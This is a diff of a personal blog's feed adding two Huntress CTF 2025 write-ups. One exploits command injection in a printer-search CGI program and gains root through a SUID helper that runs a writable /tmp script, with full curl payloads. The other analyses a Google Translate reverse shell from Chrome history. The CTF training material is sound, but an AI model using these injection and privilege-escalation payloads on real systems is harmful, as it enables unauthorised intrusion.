@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-01T15:46:16+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Writeups</title><subtitle>Website where I will publish my writeups</subtitle><author><name>alphaz3r0</name><email></email></author><entry><title type="html">Huntress CTF 2025 - Bussing Around</title><link href="http://localhost:4000/writeup/forensics/network/Bussing-Around" rel="alternate" type="text/html" title="Huntress CTF 2025 - Bussing Around" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/network/Bussing-Around</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/network/Bussing-Around"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-01T16:23:24+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Writeups</title><subtitle>Website where I will publish my writeups</subtitle><author><name>alphaz3r0</name><email></email></author><entry><title type="html">Huntress CTF 2025 - Bussing Around</title><link href="http://localhost:4000/writeup/forensics/network/Bussing-Around" rel="alternate" type="text/html" title="Huntress CTF 2025 - Bussing Around" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/network/Bussing-Around</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/network/Bussing-Around"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
 
 <blockquote>
   <p>One of the engineers noticed that an HMI was going haywire.</p>
@@ -80,7 +80,221 @@ flag: Zip archive data, at least v1.0 to extract, compression method=store
 <p>When we try to extract it we also see this comment:
 <code class="language-plaintext highlighter-rouge">Comment = The password is 5939f3ec9d820f23df20948af09a5682 .</code></p>
 
-<p>And <code class="language-plaintext highlighter-rouge">flag.txt</code> gets extracted - <code class="language-plaintext highlighter-rouge">flag{4d2a66c5ed8bb8cd4e4e1ab32c71f7a3}</code> :)</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="network" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Snooze</title><link href="http://localhost:4000/writeup/forensics/misc/Snooze" rel="alternate" type="text/html" title="Huntress CTF 2025 - Snooze" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/misc/Snooze</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/misc/Snooze"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
+<p>And <code class="language-plaintext highlighter-rouge">flag.txt</code> gets extracted - <code class="language-plaintext highlighter-rouge">flag{4d2a66c5ed8bb8cd4e4e1ab32c71f7a3}</code> :)</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="network" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Phasing Through Printers</title><link href="http://localhost:4000/writeup/misc/Phasing-Through-Printers" rel="alternate" type="text/html" title="Huntress CTF 2025 - Phasing Through Printers" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/Phasing-Through-Printers</id><content type="html" xml:base="http://localhost:4000/writeup/misc/Phasing-Through-Printers"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>I found this printer on the network, and it seems to be running… a weird web page… to search for drivers?</p>
+
+  <p>Here is some of the code I could dig up.</p>
+</blockquote>
+
+<p>NOTE</p>
+
+<blockquote>
+  <p>Escalate your privileges and uncover the flag in the <strong><code class="language-plaintext highlighter-rouge">root</code></strong> user’s home directory.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="thought-process">Thought process:</h2>
+
+<p>We are provided with folder that has this structure:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── cgi-bin
+│   └── search.c
+└── www
+    └── index.html
+</code></pre></div></div>
+
+<p>And also give the ip of web application that is running.</p>
+
+<p>Lets see what we have in index.html and search.c:</p>
+
+<h3 id="searchc">search.c:</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">urldecode2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+                    <span class="p">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">b</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&amp;&amp;</span>
+                    <span class="p">(</span><span class="n">isxdigit</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">isxdigit</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
+                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
+                                <span class="n">a</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
+                        <span class="k">else</span>
+                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
+                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
+                                <span class="n">b</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
+                        <span class="k">else</span>
+                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
+                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="mi">16</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
+                        <span class="n">src</span><span class="o">+=</span><span class="mi">3</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'+'</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
+                        <span class="n">src</span><span class="o">++</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
+<span class="p">{</span>
+   <span class="kt">char</span> <span class="o">*</span><span class="n">env_value</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="o">*</span><span class="n">save_env</span><span class="p">;</span>
+
+   <span class="n">printf</span><span class="p">(</span><span class="s">"Content-type: text/html</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+   <span class="n">save_env</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"QUERY_STRING"</span><span class="p">);</span>
+   <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="s">"q="</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">memmove</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="p">}</span>
+
+   <span class="kt">char</span> <span class="o">*</span><span class="n">decoded</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+   <span class="n">urldecode2</span><span class="p">(</span><span class="n">decoded</span><span class="p">,</span> <span class="n">save_env</span><span class="p">);</span>
+
+
+   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
+   <span class="kt">size_t</span> <span class="n">totalLength</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">first_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">last_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="o">*</span><span class="n">combinedString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totalLength</span><span class="p">);</span>
+   <span class="k">if</span> <span class="p">(</span><span class="n">combinedString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to allocate memory"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="n">strcpy</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">first_part</span><span class="p">);</span>
+   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">decoded</span><span class="p">);</span>
+   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">last_part</span><span class="p">);</span>
+   <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+
+   <span class="n">fp</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+   <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Error running command</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%s&lt;br&gt;"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+   <span class="p">}</span>
+
+   <span class="n">pclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+   <span class="n">free</span><span class="p">(</span><span class="n">combinedString</span><span class="p">);</span>
+   <span class="n">free</span><span class="p">(</span><span class="n">decoded</span><span class="p">);</span>
+   <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="indexhtml">index.html:</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;h1&gt;</span>Printer Driver Search<span class="nt">&lt;/h1&gt;</span>
+  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/cgi-bin/search.cgi"</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">placeholder=</span><span class="s">"Enter printer model or driver name"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>So it takes our input and creates request with adding these two lines:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
+</code></pre></div></div>
+
+<p>So if we searched for example for string “test” request would be:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-R</span> <span class="nt">-i</span> <span class="nb">test</span> /var/www/html/data/printer_drivers.txt
+</code></pre></div></div>
+
+<p>Now it is obvious it will be command injection because we are able to create request that will execute on a server, but we need to modify it a little:</p>
+
+<p>if we can make first and last part sepperate commands we can send a command:</p>
+
+<p>if we are able to send a request that looks like this we can execute commands on an server:</p>
+
+<p><code class="language-plaintext highlighter-rouge">;whoami;</code></p>
+
+<p>lets URL encode the <code class="language-plaintext highlighter-rouge">;</code> and send request with curl:</p>
+
+<p>after sending request like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bwhoami%3B%3B
+</code></pre></div></div>
+
+<p>We receive response that confirms our hypotesis:</p>
+
+<p><code class="language-plaintext highlighter-rouge">www-data</code></p>
+
+<p>With this we would be able to gain reverse shell but I found it faster and easier to interact with the server just by commands, and after some commands to see if we can escalate our privilages. After some digging I looked at the files with the <strong>SUID bit set</strong> (the setuid permission):</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -perm -4000 -type f 2&gt;&amp;1</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bfind%20/%20-perm%20-4000%20-type%20f%202%3E%261%3B"</code></p>
+
+<p>And we see one interesting application that has SUID bit set:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>
+
+<p>My first thought was to somehow get it on my machine and preform some reverse engineering but first I ran strings to see if there is anything interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bstrings%20/usr/local/bin/admin_help%3B"
+</code></pre></div></div>
+
+<p>And I saw this part:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;Your wish is my command... maybe :)
+&lt;br&gt;chmod +x /tmp/wish.sh &amp;&amp; /tmp/wish.sh
+</code></pre></div></div>
+
+<p>So it gives temp file called wish.sh executable bit and executes it. Can we create that file and write to it what we want, lets see if we have privileges to create files in <code class="language-plaintext highlighter-rouge">/tmp</code> folder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bls%20-ld%20%2Ftmp%3B"
+drwxrwxrwt 1 root root 4096 Oct 15 13:13 /tmp
+</code></pre></div></div>
+
+<p>that part at the end: <code class="language-plaintext highlighter-rouge">rwt</code> means others can read, write, execute + <strong>sticky bit</strong></p>
+
+<p>Lets echo a command to that file and then run <code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>
+
+<h2 id="exploit">Exploit:</h2>
+
+<p><code class="language-plaintext highlighter-rouge">;echo "whoami" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>
+
+<p>URL encoding it and sending a request with curl we get:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22whoami%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"
+
+root
+</code></pre></div></div>
+
+<p>And just like that we pwned the system now only thing left is to cat the flag as root.</p>
+
+<h2 id="final-exploit">Final exploit</h2>
+
+<p><code class="language-plaintext highlighter-rouge">;echo "cat /root/flag.txt" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>
+
+<p>URL encoding it and sending a request with curl we get the flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22cat%20%2Froot%2Fflag%2Etxt%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"
+
+flag{93541544b91b7d2b9d61e90becbca309}
+</code></pre></div></div>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Snooze</title><link href="http://localhost:4000/writeup/forensics/misc/Snooze" rel="alternate" type="text/html" title="Huntress CTF 2025 - Snooze" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/misc/Snooze</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/misc/Snooze"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
 
 <blockquote>
   <p>Don’t bug me, I’m sleeping! Zzzz… zzz… zzzz….</p>
@@ -995,4 +1209,119 @@ Clean flag: flag<span class="o">{</span>d341b8d2c96e9cc96965afbf5675fc26<span cl
   <li>XOR-encrypted shellcode containing the flag</li>
 </ol>
 
-<p>The key was to follow the chain of execution and analyze the shellcode to extract the hidden flag. The shellcode used XOR encryption with <code class="language-plaintext highlighter-rouge">0xA5A5A5A5</code> to hide the flag in memory, and understanding the stack order was crucial for proper decoding.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="malware" /><summary type="html"><![CDATA[Category: Malware]]></summary></entry></feed>
+<p>The key was to follow the chain of execution and analyze the shellcode to extract the hidden flag. The shellcode used XOR encryption with <code class="language-plaintext highlighter-rouge">0xA5A5A5A5</code> to hide the flag in memory, and understanding the stack order was crucial for proper decoding.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="malware" /><summary type="html"><![CDATA[Category: Malware]]></summary></entry><entry><title type="html">Huntress CTF 2025 - XMDR</title><link href="http://localhost:4000/writeup/misc/XMDR" rel="alternate" type="text/html" title="Huntress CTF 2025 - XMDR" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/XMDR</id><content type="html" xml:base="http://localhost:4000/writeup/misc/XMDR"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>We had a lot of fun helping the Internet understand what MDRs are, but we thought of the&gt;next the best thing:<br />
+  <strong>why not have you <em>use one!</em></strong> 😄</p>
+</blockquote>
+
+<blockquote>
+  <p>A host that you protect had some strange alerts fire off… can you analyze and triage to find other malicious activity?</p>
+</blockquote>
+
+<p>Provided IP: <code class="language-plaintext highlighter-rouge">10.1.182.225</code></p>
+
+<hr />
+
+<p>After accessing the site we see this:</p>
+
+<p>![[alerts.png]]</p>
+
+<p>We can download the zip file.</p>
+
+<p>After looking through the GTRS folder we notice that is the Google Translate Reverse Shell</p>
+
+<p>I searched where are browser histories stored in windows system(for Google):
+<code class="language-plaintext highlighter-rouge">C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History</code></p>
+
+<p>We don’t see the extension, so what kind of file is it?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>History: SQLite 3.x database, last written using SQLite version 3050000, file counter 19, database pages 77, cookie 0x21  
+, schema 4, UTF-8, version-valid-for 19
+</code></pre></div></div>
+
+<p>after extracting link and URL decoding them I find these:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://translate.google.com/?sl=auto&amp;tl=en&amp;text=STARTCOMMAND  
+begin 664 -  
+,=&amp;%S:VQI&lt;W0@+W8*  
+`  
+end  
+ENDCOMMAND  
+&amp;op=translate
+</code></pre></div></div>
+
+<p>I went to the dcode.fr for their cipher identifier and it said it is UUencoded</p>
+
+<p>So I wrote a a script to url decode history links and to extract just the part between the 
+<code class="language-plaintext highlighter-rouge">begin 664 -</code> and <code class="language-plaintext highlighter-rouge">end</code></p>
+
+<h3 id="python">Python</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sqlite3</span>  
+<span class="kn">import</span> <span class="nn">os</span>  
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>  
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>  
+<span class="kn">import</span> <span class="nn">re</span>  
+  
+<span class="k">def</span> <span class="nf">extract_chrome_history</span><span class="p">(</span><span class="n">history_path</span><span class="p">):</span>  
+<span class="err">   </span><span class="c1"># Chrome locks the history file, so we need to copy it  
+</span><span class="err">   </span><span class="kn">import</span> <span class="nn">shutil</span>  
+<span class="err">   </span><span class="n">temp_db</span> <span class="o">=</span> <span class="s">"temp_chrome_history.db"</span>  
+<span class="err">   </span><span class="n">shutil</span><span class="p">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">history_path</span><span class="p">,</span> <span class="n">temp_db</span><span class="p">)</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">temp_db</span><span class="p">)</span>  
+<span class="err">   </span><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="c1"># Query to get browsing history  
+</span><span class="err">   </span><span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"""  
+       SELECT    
+           urls.url,    
+           urls.title,    
+           urls.visit_count,    
+           urls.last_visit_time,    
+           visits.visit_time,  
+           visits.from_visit  
+       FROM urls    
+       LEFT JOIN visits ON urls.id = visits.url    
+       ORDER BY urls.last_visit_time DESC  
+   """</span><span class="p">)</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="n">history</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="k">print</span><span class="p">(</span><span class="s">"=== Extracted Content from Chrome History ==="</span><span class="p">)</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">history</span><span class="p">[:</span><span class="mi">50</span><span class="p">]:</span> <span class="err"> </span><span class="c1"># Show first 50 entries  
+</span><span class="err">       </span><span class="n">url</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">visit_count</span><span class="p">,</span> <span class="n">last_visit_time</span><span class="p">,</span> <span class="n">visit_time</span><span class="p">,</span> <span class="n">from_visit</span> <span class="o">=</span> <span class="n">entry</span>  
+<span class="err">        </span>  
+<span class="err">       </span><span class="c1"># URL decode the URL and title  
+</span><span class="err">       </span><span class="n">decoded_url</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">if</span> <span class="n">url</span> <span class="k">else</span> <span class="s">""</span>  
+<span class="err">       </span><span class="n">decoded_title</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">title</span><span class="p">)</span> <span class="k">if</span> <span class="n">title</span> <span class="k">else</span> <span class="s">""</span>  
+<span class="err">        </span>  
+<span class="err">       </span><span class="c1"># Extract content between "begin 664 -" and "end"  
+</span><span class="err">       </span><span class="n">begin_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"begin 664 -(.*?)end"</span>  
+<span class="err">       </span><span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">begin_pattern</span><span class="p">,</span> <span class="n">decoded_url</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>  
+<span class="err">        </span>  
+<span class="err">       </span><span class="k">if</span> <span class="n">matches</span><span class="p">:</span>  
+<span class="err">           </span><span class="k">for</span> <span class="n">match</span> <span class="ow">in</span> <span class="n">matches</span><span class="p">:</span>  
+<span class="err">               </span><span class="n">extracted_content</span> <span class="o">=</span> <span class="n">match</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>  
+<span class="err">               </span><span class="k">if</span> <span class="n">extracted_content</span><span class="p">:</span> <span class="err"> </span><span class="c1"># Only print if there's actual content  
+</span><span class="err">                   </span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  
+<span class="err">                   </span><span class="k">print</span><span class="p">(</span><span class="n">extracted_content</span><span class="p">)</span>  
+<span class="err">    </span>  
+<span class="err">   </span><span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>  
+<span class="err">   </span><span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">temp_db</span><span class="p">)</span> <span class="err"> </span><span class="c1"># Clean up  
+</span>  
+<span class="c1"># Usage - replace with your actual path  
+</span><span class="n">history_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"History"</span>  
+<span class="n">extract_chrome_history</span><span class="p">(</span><span class="n">history_path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And then just going online to find UUEncode Decoder and we get the flag:</p>
+
+<p>“L96-H;R!F;&amp;%G&gt;S8Y,C<code class="language-plaintext highlighter-rouge">P8S$S9&amp;-B,SED93$Y830P-64Y9#%F.3DS.#(Q?0H</code>”</p>
+
+<p>which when UUDecoded is:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo flag{69200c13dcb39de19a405e9d1f993821}</code></p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry></feed>
